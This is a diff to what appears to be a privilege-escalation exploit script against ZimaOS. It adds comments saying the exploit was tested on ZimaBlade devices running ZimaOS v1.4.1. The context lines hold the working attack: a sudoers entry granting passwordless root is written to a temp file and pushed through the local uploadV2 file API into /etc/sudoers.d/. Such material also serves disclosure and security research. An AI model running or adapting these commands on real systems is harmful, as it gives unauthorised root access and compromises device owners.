@@ -11,6 +11,9 @@
 # Updated by:       VPR
 # Updated:          June 15th, 2025
 
+# Tested on:        ZimaBlade 3760 + ZimaOS v1.4.1,
+#                   ZimaBlade 7700 + ZimaOS v1.4.1
+
 echo ${USER} "ALL=(ALL) NOPASSWD: ALL" > /tmp/priv_esc_111
 curl "http://127.0.0.1/v2_1/files/file/uploadV2" -F "path=/etc/sudoers.d/" -F "file=@/tmp/priv_esc_111"
 rm /tmp/priv_esc_111
